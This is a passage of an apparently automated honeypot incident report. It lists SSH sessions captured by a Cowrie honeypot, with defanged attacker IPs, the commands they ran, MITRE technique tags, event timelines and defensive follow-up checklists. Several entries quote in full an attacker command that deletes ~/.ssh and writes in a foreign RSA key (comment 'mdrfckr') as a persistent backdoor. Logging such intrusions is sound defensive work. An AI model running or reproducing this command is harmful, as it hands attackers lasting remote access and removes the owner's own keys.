| `2026-07-02 04:42:07` | `cowrie.session.connect` |
| `2026-07-02 04:42:07` | `cowrie.client.version` |
| `2026-07-02 04:42:07` | `cowrie.client.kex` |
| `2026-07-02 04:42:09` | `cowrie.login.success` |
| `2026-07-02 04:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.53[.]14` to AbuseIPDB if not already reported
- [ ] Block `101.126.53[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a1a439f5eb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:42 |
| **Last Seen** | 2026-07-02 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:42:12` | `cowrie.session.connect` |
| `2026-07-02 04:42:12` | `cowrie.client.version` |
| `2026-07-02 04:42:12` | `cowrie.client.kex` |
| `2026-07-02 04:42:13` | `cowrie.login.success` |
| `2026-07-02 04:42:14` | `cowrie.session.params` |
| `2026-07-02 04:42:14` | `cowrie.command.input` |
| `2026-07-02 04:42:15` | `cowrie.log.closed` |
| `2026-07-02 04:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016799fdb5f7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 04:42 |
| **Last Seen** | 2026-07-02 04:42 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:42:20` | `cowrie.session.connect` |
| `2026-07-02 04:42:22` | `cowrie.client.version` |
| `2026-07-02 04:42:22` | `cowrie.client.kex` |
| `2026-07-02 04:42:28` | `cowrie.login.success` |
| `2026-07-02 04:42:32` | `cowrie.session.params` |
| `2026-07-02 04:42:32` | `cowrie.command.input` |
| `2026-07-02 04:42:33` | `cowrie.log.closed` |
| `2026-07-02 04:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89cb5f2a82fb

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 04:44 |
| **Last Seen** | 2026-07-02 04:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:44:41` | `cowrie.session.connect` |
| `2026-07-02 04:44:42` | `cowrie.client.version` |
| `2026-07-02 04:44:42` | `cowrie.client.kex` |
| `2026-07-02 04:44:45` | `cowrie.login.success` |
| `2026-07-02 04:44:46` | `cowrie.session.params` |
| `2026-07-02 04:44:46` | `cowrie.command.input` |
| `2026-07-02 04:44:47` | `cowrie.log.closed` |
| `2026-07-02 04:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8ace4f07d1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:47 |
| **Last Seen** | 2026-07-02 04:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:47:15` | `cowrie.session.connect` |
| `2026-07-02 04:47:15` | `cowrie.client.version` |
| `2026-07-02 04:47:15` | `cowrie.client.kex` |
| `2026-07-02 04:47:16` | `cowrie.login.success` |
| `2026-07-02 04:47:17` | `cowrie.session.params` |
| `2026-07-02 04:47:17` | `cowrie.command.input` |
| `2026-07-02 04:47:17` | `cowrie.log.closed` |
| `2026-07-02 04:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d1f9b9120c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 04:48 |
| **Last Seen** | 2026-07-02 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:48:00` | `cowrie.session.connect` |
| `2026-07-02 04:48:00` | `cowrie.client.version` |
| `2026-07-02 04:48:00` | `cowrie.client.kex` |
| `2026-07-02 04:48:00` | `cowrie.login.success` |
| `2026-07-02 04:48:01` | `cowrie.session.params` |
| `2026-07-02 04:48:01` | `cowrie.command.input` |
| `2026-07-02 04:48:01` | `cowrie.log.closed` |
| `2026-07-02 04:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e956c75b206f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:52 |
| **Last Seen** | 2026-07-02 04:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:52:09` | `cowrie.session.connect` |
| `2026-07-02 04:52:09` | `cowrie.client.version` |
| `2026-07-02 04:52:09` | `cowrie.client.kex` |
| `2026-07-02 04:52:09` | `cowrie.login.success` |
| `2026-07-02 04:52:11` | `cowrie.session.params` |
| `2026-07-02 04:52:11` | `cowrie.command.input` |
| `2026-07-02 04:52:11` | `cowrie.log.closed` |
| `2026-07-02 04:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325be6c42e33

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 04:54 |
| **Last Seen** | 2026-07-02 04:54 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:54:09` | `cowrie.session.connect` |
| `2026-07-02 04:54:12` | `cowrie.client.version` |
| `2026-07-02 04:54:12` | `cowrie.client.kex` |
| `2026-07-02 04:54:18` | `cowrie.login.success` |
| `2026-07-02 04:54:22` | `cowrie.session.params` |
| `2026-07-02 04:54:22` | `cowrie.command.input` |
| `2026-07-02 04:54:24` | `cowrie.log.closed` |
| `2026-07-02 04:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ce4b318eca

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-02 04:56 |
| **Last Seen** | 2026-07-02 04:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:56:35` | `cowrie.session.connect` |
| `2026-07-02 04:56:35` | `cowrie.client.version` |
| `2026-07-02 04:56:35` | `cowrie.client.kex` |
| `2026-07-02 04:56:36` | `cowrie.login.success` |
| `2026-07-02 04:56:36` | `cowrie.session.params` |
| `2026-07-02 04:56:36` | `cowrie.command.input` |
| `2026-07-02 04:56:36` | `cowrie.command.failed` |
| `2026-07-02 04:56:37` | `cowrie.log.closed` |
| `2026-07-02 04:56:37` | `cowrie.session.params` |
| `2026-07-02 04:56:37` | `cowrie.command.input` |
| `2026-07-02 04:56:38` | `cowrie.session.file_download` |
| `2026-07-02 04:56:38` | `cowrie.log.closed` |
| `2026-07-02 04:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5d29b2166d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-02 04:56 |
| **Last Seen** | 2026-07-02 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:56:38` | `cowrie.session.connect` |
| `2026-07-02 04:56:38` | `cowrie.client.version` |
| `2026-07-02 04:56:38` | `cowrie.client.kex` |
| `2026-07-02 04:56:38` | `cowrie.login.success` |
| `2026-07-02 04:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58769c89dfcc

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]87` |
| **First Seen** | 2026-07-02 04:56 |
| **Last Seen** | 2026-07-02 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:56:38` | `cowrie.session.connect` |
| `2026-07-02 04:56:38` | `cowrie.client.version` |
| `2026-07-02 04:56:39` | `cowrie.client.kex` |
| `2026-07-02 04:56:39` | `cowrie.login.success` |
| `2026-07-02 04:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]87` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098a4ea12211

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:57 |
| **Last Seen** | 2026-07-02 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:57:09` | `cowrie.session.connect` |
| `2026-07-02 04:57:09` | `cowrie.client.version` |
| `2026-07-02 04:57:09` | `cowrie.client.kex` |
| `2026-07-02 04:57:09` | `cowrie.login.success` |
| `2026-07-02 04:57:11` | `cowrie.session.params` |
| `2026-07-02 04:57:11` | `cowrie.command.input` |
| `2026-07-02 04:57:11` | `cowrie.log.closed` |
| `2026-07-02 04:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-504efee46b0a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 04:58 |
| **Last Seen** | 2026-07-02 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:58:33` | `cowrie.session.connect` |
| `2026-07-02 04:58:33` | `cowrie.client.version` |
| `2026-07-02 04:58:33` | `cowrie.client.kex` |
| `2026-07-02 04:58:34` | `cowrie.login.success` |
| `2026-07-02 04:58:36` | `cowrie.session.params` |
| `2026-07-02 04:58:36` | `cowrie.command.input` |
| `2026-07-02 04:58:36` | `cowrie.log.closed` |
| `2026-07-02 04:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0223e8c80b68

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-07-02 05:01 |
| **Last Seen** | 2026-07-02 05:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:01:06` | `cowrie.session.connect` |
| `2026-07-02 05:01:06` | `cowrie.client.version` |
| `2026-07-02 05:01:06` | `cowrie.client.kex` |
| `2026-07-02 05:01:07` | `cowrie.login.success` |
| `2026-07-02 05:01:08` | `cowrie.session.params` |
| `2026-07-02 05:01:08` | `cowrie.command.input` |
| `2026-07-02 05:01:08` | `cowrie.command.failed` |
| `2026-07-02 05:01:08` | `cowrie.log.closed` |
| `2026-07-02 05:01:09` | `cowrie.session.params` |
| `2026-07-02 05:01:09` | `cowrie.command.input` |
| `2026-07-02 05:01:09` | `cowrie.session.file_download` |
| `2026-07-02 05:01:09` | `cowrie.log.closed` |
| `2026-07-02 05:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2dafeeaa83

| Field | Detail |
|---|---|
| **Source IP** | `122.176.20[.]134` |
| **First Seen** | 2026-07-02 05:01 |
| **Last Seen** | 2026-07-02 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:01:10` | `cowrie.session.connect` |
| `2026-07-02 05:01:10` | `cowrie.client.version` |
| `2026-07-02 05:01:10` | `cowrie.client.kex` |
| `2026-07-02 05:01:11` | `cowrie.login.success` |
| `2026-07-02 05:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.20[.]134` to AbuseIPDB if not already reported
- [ ] Block `122.176.20[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08035a0044f9

| Field | Detail |
|---|---|
| **Source IP** | `106.219.156[.]130` |
| **First Seen** | 2026-07-02 05:01 |
| **Last Seen** | 2026-07-02 05:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:01:12` | `cowrie.session.connect` |
| `2026-07-02 05:01:12` | `cowrie.client.version` |
| `2026-07-02 05:01:13` | `cowrie.client.kex` |
| `2026-07-02 05:01:14` | `cowrie.login.success` |
| `2026-07-02 05:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.219.156[.]130` to AbuseIPDB if not already reported
- [ ] Block `106.219.156[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f5e1e8c4be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:02 |
| **Last Seen** | 2026-07-02 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:02:30` | `cowrie.session.connect` |
| `2026-07-02 05:02:30` | `cowrie.client.version` |
| `2026-07-02 05:02:30` | `cowrie.client.kex` |
| `2026-07-02 05:02:31` | `cowrie.login.success` |
| `2026-07-02 05:02:32` | `cowrie.session.params` |
| `2026-07-02 05:02:32` | `cowrie.command.input` |
| `2026-07-02 05:02:32` | `cowrie.log.closed` |
| `2026-07-02 05:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144d85ffbb49

| Field | Detail |
|---|---|
| **Source IP** | `117.34.85[.]169` |
| **First Seen** | 2026-07-02 05:05 |
| **Last Seen** | 2026-07-02 05:10 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:05:02` | `cowrie.session.connect` |
| `2026-07-02 05:05:02` | `cowrie.client.version` |
| `2026-07-02 05:05:02` | `cowrie.client.kex` |
| `2026-07-02 05:05:03` | `cowrie.login.success` |
| `2026-07-02 05:05:05` | `cowrie.session.params` |
| `2026-07-02 05:05:05` | `cowrie.command.input` |
| `2026-07-02 05:05:05` | `cowrie.command.failed` |
| `2026-07-02 05:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.34.85[.]169` to AbuseIPDB if not already reported
- [ ] Block `117.34.85[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a46852e4237

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]53` |
| **First Seen** | 2026-07-02 05:05 |
| **Last Seen** | 2026-07-02 05:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:05:15` | `cowrie.session.connect` |
| `2026-07-02 05:05:15` | `cowrie.client.version` |
| `2026-07-02 05:05:15` | `cowrie.client.kex` |
| `2026-07-02 05:05:16` | `cowrie.login.success` |
| `2026-07-02 05:05:16` | `cowrie.session.params` |
| `2026-07-02 05:05:16` | `cowrie.command.input` |
| `2026-07-02 05:05:16` | `cowrie.command.failed` |
| `2026-07-02 05:05:16` | `cowrie.log.closed` |
| `2026-07-02 05:05:17` | `cowrie.session.params` |
| `2026-07-02 05:05:17` | `cowrie.command.input` |
| `2026-07-02 05:05:17` | `cowrie.session.file_download` |
| `2026-07-02 05:05:17` | `cowrie.log.closed` |
| `2026-07-02 05:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]53` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0947d727a8de

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]53` |
| **First Seen** | 2026-07-02 05:05 |
| **Last Seen** | 2026-07-02 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:05:17` | `cowrie.session.connect` |
| `2026-07-02 05:05:17` | `cowrie.client.version` |
| `2026-07-02 05:05:17` | `cowrie.client.kex` |
| `2026-07-02 05:05:18` | `cowrie.login.success` |
| `2026-07-02 05:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]53` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7e5a6082e48

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]53` |
| **First Seen** | 2026-07-02 05:05 |
| **Last Seen** | 2026-07-02 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:05:18` | `cowrie.session.connect` |
| `2026-07-02 05:05:18` | `cowrie.client.version` |
| `2026-07-02 05:05:18` | `cowrie.client.kex` |
| `2026-07-02 05:05:18` | `cowrie.login.success` |
| `2026-07-02 05:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]53` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25df31b55694

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 05:05 |
| **Last Seen** | 2026-07-02 05:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:05:59` | `cowrie.session.connect` |
| `2026-07-02 05:06:00` | `cowrie.client.version` |
| `2026-07-02 05:06:00` | `cowrie.client.kex` |
| `2026-07-02 05:06:05` | `cowrie.login.success` |
| `2026-07-02 05:06:08` | `cowrie.session.params` |
| `2026-07-02 05:06:08` | `cowrie.command.input` |
| `2026-07-02 05:06:11` | `cowrie.log.closed` |
| `2026-07-02 05:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-584ed6052916

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 05:07 |
| **Last Seen** | 2026-07-02 05:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:07:34` | `cowrie.session.connect` |
| `2026-07-02 05:07:34` | `cowrie.client.version` |
| `2026-07-02 05:07:35` | `cowrie.client.kex` |
| `2026-07-02 05:07:35` | `cowrie.login.success` |
| `2026-07-02 05:07:36` | `cowrie.session.params` |
| `2026-07-02 05:07:36` | `cowrie.command.input` |
| `2026-07-02 05:07:37` | `cowrie.log.closed` |
| `2026-07-02 05:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58396f9078e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 05:12 |
| **Last Seen** | 2026-07-02 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 05:12:03` | `cowrie.session.connect` |
| `2026-07-02 05:12:04` | `cowrie.client.version` |
| `2026-07-02 05:12:04` | `cowrie.client.kex` |
| `2026-07-02 05:12:06` | `cowrie.login.success` |
| `2026-07-02 05:12:07` | `cowrie.session.params` |
| `2026-07-02 05:12:07` | `cowrie.command.input` |
| `2026-07-02 05:12:08` | `cowrie.log.closed` |
| `2026-07-02 05:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
